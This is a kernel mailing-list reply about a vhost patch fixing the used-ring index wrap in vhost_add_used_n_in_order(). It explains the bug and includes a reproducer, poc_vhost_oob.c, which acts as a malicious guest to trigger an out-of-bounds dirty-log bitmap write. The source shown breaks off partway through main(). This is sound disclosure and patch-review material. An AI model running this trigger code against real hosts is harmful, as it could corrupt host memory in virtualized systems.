Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=115.124.28.194
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1792663631;
	b=LT4f6fbC5HBD8h0EzmqZCaslUaqkK28eYc4J7m0kz91SUArfVmybGQbX+HjndQDxodAD
	 MxX0+9q307MD3pyZ13YEl3VW9bEzsFsUXXgdOkh4SNcB6qSiT3rb3TNvFi3S015V197M9
	 kwrZeuRRnU8M8owEbiyRpriJDAvQTToxsHa5vwPXRvq6GSgWnJW03jllGeEbIVKIcHKNU
	 nCdZmjPyF07QGCEr1moEYLMZYYq2NCJYgAayKX2mQKJ9TukQRhqQ9OT22F+7D6cyR1qhW
	 hszvonxXp6+HVAfNhGwpbFXgps+T0C5iJP+72BiHb2Asj8RqBIJCKq3qPCqIMdVmo2g==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792663631;
	h=DMARC-Filter:DKIM-Signature:X-Alimail-AntiSpam:Received:From:To:Cc:
	 Subject:Date:Message-ID:X-Mailer:In-Reply-To:References:MIME-Version:
	 Content-Transfer-Encoding;
	bh=i+Ixl+Xf7a/si3EtU8k/cvHN2xiK62LZsqwAqr9zy4c=;
	b=roWsy2HvXNc7b2i74ZSJFCSFNVaMMeRWOBtIJv7OeWCOwsx+vq1oeEhf6nUE/zm4qvjc
	 Jjg45b5rmsJ7FvvIomh7cbCnme1VAY7Tz4rTmxzVvqd8EKGqU87HEGL3XcfzxoFOyKIZY
	 m97gc9JX1q/wLPm6eUpuIUBEW8/cN5Y2yz2o+5dMS4TI4dp2oE7/mHbf25FhsOs0z6uQO
	 u1N+O0mJxj5WCgrDBIEtRX9znMnVyuJLr9d6iSz6YA4FUNCgS90YRJWwjzTh7ocOXl8zB
	 rChbKOQUTSFI0iLdP2IKwTQlPgBWA3FXJC2DLBt8PDDMTLKezTzBvIa/83A6lRJuCkw==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=none header.from=xiaopeng.com;
	spf=pass smtp.mailfrom=xiaopeng.com;
	dkim=pass header.d=xiaopeng.com header.i=@xiaopeng.com header.a=rsa-sha256 header.s=default header.b=Zy9W9nn0;
	arc=none smtp.remote-ip=115.124.28.194
Received: from out28-194.mail.aliyun.com (out28-194.mail.aliyun.com [115.124.28.194])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3E871606A319;
	Thu, 22 Oct 2026 10:07:06 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 3E871606A319
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=xiaopeng.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=xiaopeng.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key, unprotected) header.d=xiaopeng.com header.i=@xiaopeng.com header.a=rsa-sha256 header.s=default header.b=Zy9W9nn0
DKIM-Signature:v=1; a=rsa-sha256; c=relaxed/relaxed;
	d=xiaopeng.com; s=default;
	t=1792663618; h=From:To:Subject:Date:Message-ID:MIME-Version;
	bh=i+Ixl+Xf7a/si3EtU8k/cvHN2xiK62LZsqwAqr9zy4c=;
	b=Zy9W9nn0t9jyLB6mSiEW45MNKv8bvcubGINVA85E2nbnA3erXu3TAaupz4O+iAAj4kjSipXE4cacHpCKIX+amKeTgb0afmqnJZ2zIlftQy4LO84y1KPgZ6WxAAALdnODqEiLAzPt7H/feAUMwV4A6KbeIF5RsftOYBYQU7GZZHM=
X-Alimail-AntiSpam:AC=CONTINUE;BC=0.04436259|-1;CH=green;DM=|CONTINUE|false|;DS=CONTINUE|ham_social|0.0100317-0.000324181-0.989644;FP=14759255983870520573|0|0|0|0|-1|-1|-1;HT=maildocker-contentspam033037034017;MF=fangxy@xiaopeng.com;NM=1;PH=DS;RN=9;RT=9;SR=0;TI=SMTPD_---.jnIgm.A_1792663616;
Received: from localhost.localdomain(mailfrom:fangxy@xiaopeng.com fp:SMTPD_---.jnIgm.A_1792663616 cluster:ay29)
          by smtp.aliyun-inc.com;
          Thu, 22 Oct 2026 18:06:57 +0800
From: Fang Xieyan <fangxy@xiaopeng.com>
To: mst@redhat.com,
	jasowang@redhat.com,
	eperezma@redhat.com
Cc: virtualization@lists.linux.dev,
	kvm@vger.kernel.org,
	netdev@vger.kernel.org,
	stable@vger.kernel.org,
	linux-kernel@vger.kernel.org,
	liuwb@xiaopeng.com
Subject: Re: [PATCH] vhost: fix used ring index wrap in vhost_add_used_n_in_order
Date: Thu, 22 Oct 2026 18:06:56 +0800
Message-ID: <20261022100656.39488-1-fangxy@xiaopeng.com>
X-Mailer: git-send-email 2.50.1
In-Reply-To: <20261020232956.99970-1-fangxy@xiaopeng.com>
References: <20261020232956.99970-1-fangxy@xiaopeng.com>
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Post: <mailto:stable@vger.kernel.org>
List-Help: <mailto:stable+help@vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
List-Owner: <mailto:stable+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

> Can you send the reproducer? I'm very curious about how vhost_net
> reaches to done_idx=64. It seems some bound needs to be added there
> too, isn't it?

The reproducer is inlined at the bottom of this mail (poc_vhost_oob.c)
and builds with:

    gcc -static -O2 -pthread -o poc_vhost_oob poc_vhost_oob.c

Run it as root inside a guest on an unpatched kernel containing
67a873df0c41. It configures a 32-entry TX vring, requests
VIRTIO_F_IN_ORDER, VIRTIO_NET_F_MRG_RXBUF and VIRTIO_F_VERSION_1,
enables used-ring dirty logging, and attaches a tap backend. The
reproducer requires a 4 KiB-page kernel and checks the required
features at startup.

The reproduction is timing-dependent, so the results below describe
the kernel and configuration we tested, not every unpatched kernel.

How done_idx reaches 64:

vhost refreshes its cached avail index only when the cached window is
exhausted. The available-index sanity check runs at that refresh, not
on every descriptor pull. The writer advances avail->idx to rx + num,
where rx is the tap's rx_packets counter, a lagging proxy for vhost's
consumption. Jumbo TX frames give the writer time to replenish the
ring while vhost drains it. Transient overshoots can still trigger
EINVAL; the reproducer's recovery path handles those cases.

The instrumented run below confirms that done_idx reached the
VHOST_NET_BATCH limit of 64. With num=32 and last_used initially 3,
vhost_add_used_n_in_order() computes start=3+64 and subtracts num
only once, leaving start=35. The used-ring entry itself is written
using the initial valid index because this TX flush uses count=1.
However, log_used() subsequently derives its length from the invalid
start, causing the unsigned underflow.

For reference, here is a trimmed transcript from the instrumented
7.3-rc7 run after the TAP vnet-header fix. The kernel messages come
from temporary debug instrumentation and do not appear on a stock
kernel:

    [poc] tap poc0 vnet_hdr_sz set to 12
    [poc] negotiated: 0x904008000 (IN_ORDER=1 MRG_RXBUF=1 V1=1 LOG_ALL=1)
    [    1.763425] POCDBG max done_idx at flush=64 num=32
    [    1.818827] vhost: log_used OOB write: used_offset=28 len=34359738344
    [poc] used->idx after = 64675 (delta=64675) max_refill_step=32 ...
    [poc] canary intact (probe may still have fired; see dmesg)
    [poc] *** LOG BITMAP CANARY CORRUPTED -> log_used() OOB write CONFIRMED ***
    [poc] log bitmap canary (64 bytes): ff ff ff ff ff ff ff ff ... (all 0xff)
    ==== PoC exit code: 0 ====

The log_used diagnostic was emitted 3589 times in this run, counted
from the per-hit pr_err messages; the WARN_ON_ONCE warning and stack
trace appeared only once. The reported length,
34359738344 = (2^32 - 3) * 8, matches the underflow for num=32 and
start=35. The bitmap canary changing from 0xA5 to 0xFF confirms that
set_bit_to_user() wrote beyond the logical dirty-log bitmap. The
used-ring canary remained intact, consistent with the count=1 TX path.

The used-ring dirty-log bitmap in this reproducer is mapped by the
PoC itself. This demonstrates the out-of-bounds write in the tested
vhost path, but is not by itself an end-to-end exploit against a real
host; the impact on a host's live bitmap depends on its memory layout.

> It seems some bound needs to be added there too, isn't it?

Regarding the additional bound: the current patch fixes the immediate
ring-index wrap and prevents the log_used() length underflow. The
reproducer also shows that done_idx can reach 64 when vq->num is 32,
while the existing single-subtraction logic implicitly assumes
nheads[i] <= vq->num.

Would you prefer to keep this patch focused on the index-wrap fix and
address bounding the in-order TX batch in a separate follow-up, or
should the bound be handled together with this fix? My inclination is
to discuss the batching limit separately, since changing the TX
batching path deserves its own review and testing.

> The patch itself looks good to me, even if we will need to modify it
> for packed vqs, so

Thanks!  This change only touches the split-ring in_order path
(vhost_add_used_n_in_order).  I will look at the packed-ring equivalent
and send it separately.

Fang Xieyan

--------------- 8< --------------- reproducer: poc_vhost_oob.c --------------- 8< ---------------
/*
 * poc_vhost_oob.c - PoC for the vhost in-order used-index wrap that causes a
 * dirty-log bitmap OOB write (the used ring itself is not written out of bounds)
 *
 * Triggers the bug in vhost_add_used_n_in_order() fixed by
 * "vhost: fix used ring index wrap in vhost_add_used_n_in_order".
 *
 * Runs INSIDE the test guest (7.3-rc7 + WARN probe), as root, playing the
 * role of a malicious guest on the TX path:
 *
 *   - opens /dev/vhost-net, negotiates VIRTIO_F_IN_ORDER + MRG_RXBUF + V1
 *   - sets a small TX vring (num=32) whose descriptors all point at large
 *     (4000-byte payload) read-only packet buffers
 *   - a writer thread advances avail->idx to rx + NUM, where rx is the poc0
 *     tap RX packet count -- a lagging proxy for what vhost has consumed.  The
 *     delta vhost sees at each re-read is therefore ~NUM minus that lag, not
 *     exactly NUM, and stays within the "avail index change <= num" window only
 *     while the writer keeps ahead (an overshoot is rejected with EINVAL and
 *     recovered), so handle_tx keeps pulling and nvq->done_idx accumulates.
 *   - the large frames make vhost's per-packet copy+sendmsg cost dominate the
 *     writer's poll latency, so d -- the logical, unwrapped amount by which
 *     vhost's consumed-descriptor count leads the tap's rx counter -- stays
 *     below num, and outstanding = num - d never reaches 0 mid-batch: vhost
 *     does not stall and done_idx climbs to the VHOST_NET_BATCH(64) cap.  The
 *     kernel's last_avail_idx is a 16-bit wrapping index while rx is
 *     cumulative, so d is defined from the unwrapped consumed-descriptor count
 *     minus rx (the raw u16 index must be extended across wraparound;
 *     subtracting last_avail_idx from rx directly would be wrong).  The PoC
 *     cannot measure it directly (it only sees rx), so done_idx==64 is confirmed
 *     by the kernel-side probe rather than inferred from the refill cadence.
 *   - a flush with done_idx=64 and num=32 hands nheads[0]=64 to
 *     vhost_add_used_n_in_order():
 *         start = last_used & (num-1); start += 64; if (start >= num) start -= num;
 *     one subtraction leaves start = (last_used & 31) + 32 >= num  => probe fires.
 *
 * What the corrupted start actually corrupts:
 *   - vhost_put_used(): TX in_order passes count=1, so the single write uses
 *     the masked-valid start; the >=num residue is computed AFTER that write
 *     and is not dereferenced again in this call.  An actual used-ring OOB
 *     write would need count>=2 with nheads[i]>num, which the mainline TX
 *     (count=1) and RX (nheads=headcount<=num) in_order paths do not produce.
 *   - log_used(): when used-ring dirty logging is on, the SAME post-loop start
 *     feeds "(vq->num - start)".  For start>num this underflows to a huge u64
 *     length, and log_write() sweeps set_bit_to_user() beyond the logical
 *     dirty-log bitmap into the PoC's own userspace mapping.  This is the
 *     reachable corruption, so this PoC enables logging (VHOST_F_LOG_ALL +
 *     VHOST_SET_LOG_BASE + VHOST_VRING_F_LOG on the used ring) and places a
 *     canary just past the 512-byte bitmap to catch the sweep.
 *
 * Why TX (not RX): RX mergeable needs headcount > num within a single
 * get_rx_bufs() call (a hard intra-call race).  TX accumulates done_idx
 * across separate packets, giving the writer thread time to refill avail
 * between pulls - far easier to win, and done_idx>=4 already triggers.
 *
 * Build (static):  gcc -static -O2 -pthread -o poc_vhost_oob poc_vhost_oob.c
 *
 * Author: Fang Xieyan <fangxy@xiaopeng.com>
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <stdint.h>
#include <pthread.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/eventfd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_tun.h>
#include <linux/vhost.h>
#include <linux/virtio_ring.h>
#include <linux/virtio_net.h>
#include <linux/virtio_config.h>

#ifndef VIRTIO_F_IN_ORDER
#define VIRTIO_F_IN_ORDER 35
#endif

/* ---- tunables ---- */
#define GUEST_MEM_SZ   (16u << 20)
#define VRING_NUM      32            /* Chosen so VHOST_NET_BATCH (64) == 2*num:
                                       * a full batch (done_idx=64) then makes
                                       * start = (last_used & 31) + 64 - 32 =
                                       * (last_used & 31) + 32 >= num after the
                                       * single subtraction, for ANY initial
                                       * last_used, so the wrap underflows and
                                       * the probe fires.  num=32 is a convenient
                                       * trigger, not a precondition -- the bug
                                       * is the single subtraction itself.  The
                                       * large TX frames below are what let
                                       * done_idx actually climb to 64. */
#define DESC_OFF       0x100
#define AVAIL_OFF      0x400
#define USED_OFF       0x600
#define CANARY_OFF     0x800
#define TXBUF0         0x1000        /* TX packet buffer 0 (GPA)           */
#define TXBUF1         0x4000        /* TX packet buffer 1 (GPA)           */
#define TX_PAYLOAD     4000          /* Jumbo frames: each pull's copy+sendmsg
                                       * costs ~100x a 60B frame, so a 32-pull
                                       * window drain takes long enough for the
                                       * writer to observe rx advance mid-drain
                                       * and keep avail = rx + num ahead of
                                       * last_avail (out = num - d > 0, where
                                       * d is the unwrapped consumed-count lead
                                       * over rx, which the PoC cannot measure
                                       * directly), so vhost
                                       * chains windows and done_idx climbs
                                       * past num to the batch cap.
                                       * 64*4026B = 257KB < VHOST_NET_WEIGHT
                                       * (512KB) so weight does not flush early.
                                       * Needs poc0 MTU raised (see tap_up). */
#define CANARY_MAGIC   0xDEADBEEF
#define VQ_TX          1             /* virtio-net TX queue index          */
#define RUN_SECONDS    10

/* ---- used-ring dirty-logging (VHOST_F_LOG_ALL) bitmap ----
 * log_used() computes (vq->num - start) with the corrupted post-loop start.
 * When start > num this underflows to a huge u64 length, and log_write() then
 * sweeps set_bit_to_user() beyond the 512-byte bitmap (16MB/4K/8) into this
 * PoC's own userspace mapping.  We lay a canary just past the legit bitmap area
 * and a PROT_NONE guard page after page 0, so the sweep corrupts the canary
 * then faults quickly instead of grinding ~1M bytes on every flush.
 *
 * NOTE: this layout assumes 4 KiB pages -- the legit bitmap is
 * GUEST_MEM_SZ/4096/8 = 512 bytes, and the guard page is mprotect()'d at
 * LOGMAP_SZ/2 = 4096, only page-aligned for a 4096-byte page.  On a kernel
 * with a larger PAGE_SIZE both would be wrong, so main() checks
 * sysconf(_SC_PAGESIZE) and aborts unless it is 4096 (this PoC targets the
 * x86 test guest, which uses 4 KiB pages). */
#define LOGMAP_SZ          8192      /* page0 = RW bitmap+canary, page1 = guard */
#define LOGBITMAP_SZ       512       /* legit bitmap: 16MB / 4096 / 8 (4K pages) */
#define LOGBIT_CANARY_OFF  512       /* canary right after the legit bitmap     */
#define LOGBIT_CANARY_SZ   64
#define LOGBIT_CANARY_BYTE 0xA5

static int g_verbose = 1;
#define DBG(...) do { if (g_verbose) fprintf(stderr, "[poc] " __VA_ARGS__); } while (0)
#define DIE(...) do { fprintf(stderr, "[poc] FATAL: " __VA_ARGS__); exit(1); } while (0)

static volatile int g_stop = 0;
/* Largest per-poll increment of the tap rx counter (rx - last_rx), reported as
 * max_refill_step.  This is NOT the true d (the unwrapped lead of last_avail_idx
 * over rx) from the strategy comment -- the PoC cannot observe last_avail_idx --
 * so it is only an indirect indicator of drain rate, never proof that done_idx
 * reached 64. */
static volatile unsigned long g_max_avail_lag = 0;
static volatile unsigned long g_avail_updates = 0;
static volatile unsigned long g_final_rx = 0;
static int g_kickfd = -1;
static struct vring_avail *g_avail;

static void hexdump(const char *tag, const void *p, size_t n)
{
    const uint8_t *b = p; size_t i;
    fprintf(stderr, "[poc] %s (%zu bytes):", tag, n);
    for (i = 0; i < n && i < 48; i++) fprintf(stderr, " %02x", b[i]);
    fprintf(stderr, "\n");
}

static int tap_open(const char *name, int vnet_hdr)
{
    struct ifreq ifr;
    int fd = open("/dev/net/tun", O_RDWR);
    if (fd < 0) DIE("open /dev/net/tun: %s\n", strerror(errno));
    memset(&ifr, 0, sizeof(ifr));
    ifr.ifr_flags = IFF_TAP | IFF_NO_PI;
    if (vnet_hdr) ifr.ifr_flags |= IFF_VNET_HDR;
    strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
    if (ioctl(fd, TUNSETIFF, &ifr) < 0) DIE("TUNSETIFF: %s\n", strerror(errno));
    if (vnet_hdr) {
        /* vhost-net negotiates VIRTIO_F_VERSION_1 + MRG_RXBUF and does NOT set
         * VHOST_NET_F_VIRTIO_NET_HDR, so vhost_net_set_features() hands the tap
         * a 12-byte virtio_net_hdr_mrg_rxbuf (sock_hlen = 12).  TUN's default
         * vnet_hdr_sz is sizeof(virtio_net_hdr) = 10, which would make the tap
         * strip only 10 bytes and mis-frame every packet; set it to 12 so the
         * tap and vhost-net agree on the header length. */
        int hdr_sz = sizeof(struct virtio_net_hdr_mrg_rxbuf);
        if (ioctl(fd, TUNSETVNETHDRSZ, &hdr_sz) < 0)
            DIE("TUNSETVNETHDRSZ: %s\n", strerror(errno));
        DBG("tap %s vnet_hdr_sz set to %d\n", ifr.ifr_name, hdr_sz);
    }
    DBG("tap %s opened (fd=%d, vnet_hdr=%d)\n", ifr.ifr_name, fd, vnet_hdr);
    return fd;
}

static void tap_up(const char *name)
{
    struct ifreq ifr;
    int sfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sfd < 0) DIE("socket: %s\n", strerror(errno));
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
    if (ioctl(sfd, SIOCGIFFLAGS, &ifr) < 0) DIE("SIOCGIFFLAGS: %s\n", strerror(errno));
    ifr.ifr_flags |= (IFF_UP | IFF_RUNNING);
    if (ioctl(sfd, SIOCSIFFLAGS, &ifr) < 0) DIE("SIOCSIFFLAGS up: %s\n", strerror(errno));
    /* Raise MTU so jumbo TX frames (TX_PAYLOAD) are not dropped by
     * tun_get_user; larger frames slow the per-pull drain (see TX_PAYLOAD). */
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
    ifr.ifr_mtu = 9000;
    if (ioctl(sfd, SIOCSIFMTU, &ifr) < 0)
        DBG("SIOCSIFMTU 9000 failed: %s (non-fatal)\n", strerror(errno));
    else
        DBG("tap %s MTU set to 9000\n", name);
    DBG("tap %s set UP\n", name);
    close(sfd);
}

/* read poc0 RX packet count == number of TX packets vhost has consumed (each
 * handle_tx sendmsg injects one frame received on poc0).
 *
 * We read the single-value sysfs counter /sys/class/net/poc0/statistics/
 * rx_packets via a cached fd + pread(0), NOT /proc/net/dev.  (In an earlier
 * version this polled /proc/net/dev, a seq_file that walks every interface on
 * each open+read; under TCG one poll cost ~340us, so the writer only observed
 * consumption once per ~num packets (max_refill_step == num) and vhost always
 * drained the whole window and flushed at done_idx == num < 2*num.  That is
 * history, not what the current code does.)  The sysfs counter is one cheap
 * syscall, letting the writer track per-packet and keep avail topped up
 * mid-batch. */
static unsigned long read_poc0_rx(void)
{
    static int fd = -1;
    char buf[32];
    ssize_t n;
    if (fd < 0) {
        fd = open("/sys/class/net/poc0/statistics/rx_packets", O_RDONLY);
        if (fd < 0) return 0;
    }
    n = pread(fd, buf, sizeof(buf) - 1, 0);
    if (n <= 0) return 0;
    buf[n] = '\0';
    return strtoul(buf, NULL, 10);
}

/* Malicious-guest refill thread.
 *
 * THE CRUX.  vhost caches avail->idx and only re-reads guest memory when the
 * cache is exhausted (last_avail_idx == avail_idx), and the sanity check
 * "(avail_idx - last_avail_idx) > num -> EINVAL" runs ONLY at that re-read.
 * Between re-reads vhost pulls blindly from the cache.  So the guest may write
 * avail->idx AHEAD during a batch; it is validated only at the next re-read
 * boundary (last_avail == old cache), where avail == last_avail + num is legal.
 *
 * We lead by ONE window: avail = rx + num, where rx is the poc0 tap RX packet
 * count -- our only host-visible view of vhost's progress, and a lagging one.
 * At a re-read the delta vhost sees is outstanding = avail - last_avail =
 * num - d, where d is the logical, unwrapped lead of vhost's consumed count
 * over the tap's rx counter (descriptors vhost has consumed but the tap counter
 * has not yet reflected).  last_avail_idx is a 16-bit wrapping index and rx is
 * cumulative, so d is defined from the unwrapped consumed-descriptor count
 * minus rx, not a literal subtraction of the raw u16 index from rx.  We cannot
 * measure d directly (rx is all we see);
 * g_max_avail_lag only records the per-poll rx increment, an indirect
 * indicator.  The TX frames are jumbo (see TX_PAYLOAD), so each pull's
 * copy+sendmsg is slow and the writer replenishes often enough to keep d < num;
 * outstanding therefore never reaches 0 at a re-read boundary, vhost never
 * stalls, and done_idx climbs to the VHOST_NET_BATCH(64) cap.  Leading by TWO
 * windows does NOT work: rx+2*num pushes outstanding over num at the batch-start
 * re-read and is rejected with EINVAL, so the lead must stay <= num.
 *
 * A flush at done_idx=64 with num=32 hands nheads[0]=64 to
 * vhost_add_used_n_in_order():
 *     start = (last_used & 31) + 64;
 *     start -= num;   // one subtraction is not enough
 * The result is (last_used & 31) + 32, always >= num for any in-ring last_used.
 * In the observed run last_used started at 3, leaving start at 35  => the wrap
 * WARN fires (the F-015 OOB write).
 *
 * If a poll transiently overshoots (before the TX pipe fills) vhost wedges in
 * EINVAL and rx stops advancing; we detect the no-progress via the idle counter
 * and reset to the always-legal avail = rx + num, then re-kick, so vhost
 * recovers. */
static void *writer_thread(void *arg)
{
    uint64_t one = 1;
    unsigned long last_rx = 0;
    unsigned long target = VRING_NUM;      /* what we currently advertise      */
    unsigned idle = 0;
    (void)arg;
    g_avail->idx = (uint16_t)target;       /* prime one legal window           */
    write(g_kickfd, &one, sizeof(one));    /* seed kick so handle_tx starts    */
    while (!g_stop) {
        unsigned long rx = read_poc0_rx();
        if (rx != last_rx) {
            /* rx - last_rx: how far the tap counter advanced since our last
             * poll -- an indirect drain-rate indicator, NOT the d (unwrapped
             * consumed-count lead over rx) that actually sets outstanding
             * (see the header comment). */
            unsigned long lag = rx - last_rx;
            unsigned long want;
            if (lag > g_max_avail_lag) g_max_avail_lag = lag;
            last_rx = rx;
            idle = 0;
            g_avail_updates++;
            /* One-window lead (advance-only, u16-wrap safe) -- see the strategy
             * comment above writer_thread().  A 2*num lead would be rejected
             * with EINVAL at the batch-start re-read, so the lead stays <= num. */
            want = rx + VRING_NUM;
            if ((uint16_t)(want - target) < 0x8000u) target = want;
            g_avail->idx = (uint16_t)target;
        } else if (++idle >= 4096) {
            /* No delivery progress: vhost is either stalled (needs a kick) or
             * wedged in EINVAL because target overshot last_avail+num.  Reset
             * to the always-legal rx+num (last_avail >= rx => rx+num is within
             * the invariant) and kick vhost back into handle_tx. */
            target = last_rx + VRING_NUM;
            g_avail->idx = (uint16_t)target;
            write(g_kickfd, &one, sizeof(one));
            idle = 0;
        }
        /* Busy-poll with sched_yield(): returns at once when the vhost worker
         * is on a sibling vCPU (-smp 4) yet still lets it run if they share a
         * core.  A real guest refills avail with a bare store; we observe via a
         * syscall so we poll flat out to keep the lead fresh. */
        sched_yield();
    }
    g_final_rx = last_rx;
    return NULL;
}





static int xioctl(int fd, unsigned long req, void *arg, const char *what)
{
    int r = ioctl(fd, req, arg);
    if (r < 0) DBG("ioctl %s FAILED: %s\n", what, strerror(errno));
    else DBG("ioctl %s ok\n", what);
    return r;
}

int main(int argc, char **argv)
{
    int vnet_hdr = 1;
    void *mem;
    int vfd, tapfd, callfd;
    uint64_t feats, sup;
    struct vhost_memory *vmem;
    struct vhost_vring_state vs;
    struct vhost_vring_addr va;
    struct vhost_vring_file vf;
    struct vring_desc *desc;
    struct vring_avail *avail;
    struct vring_used *used;
    uint32_t *canary;
    uint8_t *logmap;
    uint64_t logbase_arg;
    uint8_t *txbuf0, *txbuf1;
    uint16_t used_before, used_after;
    pthread_t wt;
    pthread_t wt2;
    int i;

    (void)argc; (void)argv;

    /* The dirty-log bitmap layout (LOGBITMAP_SZ and the guard-page offset) is
     * hard-coded for 4 KiB pages -- see the LOGBITMAP_SZ comment.  Refuse to run
     * elsewhere rather than silently mmap a bogus layout and report a
     * misleading result.  The x86 test guest uses 4 KiB pages. */
    {
        long pgsz = sysconf(_SC_PAGESIZE);
        if (pgsz != 4096)
            DIE("this reproducer assumes 4096-byte pages; sysconf(_SC_PAGESIZE)"
                " = %ld, so the dirty-log bitmap layout would be wrong\n", pgsz);
    }

    mem = mmap(NULL, GUEST_MEM_SZ, PROT_READ | PROT_WRITE,
               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) DIE("mmap: %s\n", strerror(errno));
    memset(mem, 0, GUEST_MEM_SZ);
    DBG("guest mem %p (%u MB)\n", mem, GUEST_MEM_SZ >> 20);

    /* dirty-logging bitmap: page0 holds the 512B legit bitmap + a canary just
     * past it; page1 is a PROT_NONE guard so the OOB sweep faults fast. */
    logmap = mmap(NULL, LOGMAP_SZ, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (logmap == MAP_FAILED) DIE("mmap logmap: %s\n", strerror(errno));
    memset(logmap, 0, LOGMAP_SZ);
    /* The guard page is what bounds the runaway OOB sweep: set_bit_to_user()
     * over the underflowed ~34GB length faults at +LOGMAP_SZ/2 (returning
     * -EFAULT) instead of grinding on.  main() already aborts unless the page
     * size is 4096, so this offset and length are page-aligned and mprotect
     * must succeed; treat failure as fatal rather than silently running
     * without the guard (which would make the "canary corrupted" verdict
     * depend on an unbounded sweep). */
    if (mprotect(logmap + LOGMAP_SZ / 2, LOGMAP_SZ / 2, PROT_NONE) < 0)
        DIE("mprotect guard page failed: %s\n", strerror(errno));
    memset(logmap + LOGBIT_CANARY_OFF, LOGBIT_CANARY_BYTE, LOGBIT_CANARY_SZ);
    DBG("log bitmap %p (%dB legit, guard@+%d), canary @+%d\n",
        logmap, LOGBITMAP_SZ, LOGMAP_SZ / 2, LOGBIT_CANARY_OFF);

    desc   = (struct vring_desc *)((char *)mem + DESC_OFF);
    avail  = (struct vring_avail *)((char *)mem + AVAIL_OFF);
    used   = (struct vring_used *)((char *)mem + USED_OFF);
    canary = (uint32_t *)((char *)mem + CANARY_OFF);
    txbuf0 = (uint8_t *)mem + TXBUF0;
    txbuf1 = (uint8_t *)mem + TXBUF1;
    g_avail = avail;

    /* TX packet buffers: 12-byte virtio_net_hdr (VERSION_1/MRG) + eth frame.
     * All VRING_NUM descriptors share the two packet buffers (content is
     * identical), so in_order reuse of desc 0..NUM-1 always finds a valid
     * device-readable TX buffer. */
    {
        size_t hdr = 12, flen;
        /* build one canonical large TX frame in both buffers */
        flen = hdr + 14 + TX_PAYLOAD;
        for (i = 0; i < 2; i++) {
            uint8_t *b = i ? txbuf1 : txbuf0;
            memset(b, 0, hdr);                       /* hdr: gso NONE       */
            memset(b + hdr, 0xff, 6);                /* dst broadcast       */
            memset(b + hdr + 6, 0x02, 6);            /* src                 */
            b[hdr + 12] = 0x08; b[hdr + 13] = 0x00;  /* IPv4                */
            memset(b + hdr + 14, 'A', TX_PAYLOAD);   /* big payload         */
        }
        /* descriptors 0..NUM-1: device-readable (TX), no WRITE flag */
        for (i = 0; i < VRING_NUM; i++) {
            desc[i].addr  = (i & 1) ? TXBUF1 : TXBUF0;
            desc[i].len   = flen;
            desc[i].flags = 0;                       /* read-only for TX    */
            desc[i].next  = 0;
        }
        DBG("TX buffers ready: hdr=%zu frame=%zu desc.len=%zu ndesc=%d\n",
            hdr, flen - hdr, flen, VRING_NUM);
    }

    avail->flags = 0;
    for (i = 0; i < VRING_NUM; i++) avail->ring[i] = i;
    avail->idx = 0;

    for (i = 0; i < 16; i++) canary[i] = CANARY_MAGIC;
    DBG("used ring @0x%x canary @0x%x\n", USED_OFF, CANARY_OFF);

    tapfd = tap_open("poc0", vnet_hdr);
    tap_up("poc0");

    vfd = open("/dev/vhost-net", O_RDWR);
    if (vfd < 0) DIE("open /dev/vhost-net: %s\n", strerror(errno));
    if (xioctl(vfd, VHOST_SET_OWNER, NULL, "SET_OWNER") < 0) DIE("SET_OWNER\n");

    if (ioctl(vfd, VHOST_GET_FEATURES, &sup) < 0) DIE("GET_FEATURES: %s\n", strerror(errno));
    feats = (1ULL << VIRTIO_F_VERSION_1) | (1ULL << VIRTIO_F_IN_ORDER) |
            (1ULL << VIRTIO_NET_F_MRG_RXBUF) | (1ULL << VIRTIO_NET_F_MAC) |
            (1ULL << VHOST_F_LOG_ALL);
    feats &= sup;
    DBG("negotiated: 0x%llx (IN_ORDER=%d MRG_RXBUF=%d V1=%d LOG_ALL=%d)\n",
        (unsigned long long)feats,
        !!(feats & (1ULL << VIRTIO_F_IN_ORDER)),
        !!(feats & (1ULL << VIRTIO_NET_F_MRG_RXBUF)),
        !!(feats & (1ULL << VIRTIO_F_VERSION_1)),
        !!(feats & (1ULL << VHOST_F_LOG_ALL)));
    /* The reproduction is meaningless unless these three survived negotiation:
     * IN_ORDER selects the buggy vhost_add_used_n_in_order() path, LOG_ALL
     * enables the used-ring dirty logging whose log_used() length underflows,
     * and VERSION_1 fixes the 12-byte virtio_net_hdr the TX buffers assume.
     * "feats &= sup" silently drops anything the kernel lacks, so check here and
     * abort loudly -- otherwise the PoC could run without the preconditions and
     * print "canary intact", which must not be mistaken for "not vulnerable". */
    {
        uint64_t required = (1ULL << VIRTIO_F_VERSION_1) |
